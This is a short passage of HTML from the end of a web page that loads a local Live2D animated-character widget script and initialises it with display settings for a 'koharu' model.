src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"scriptForm":"local","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>
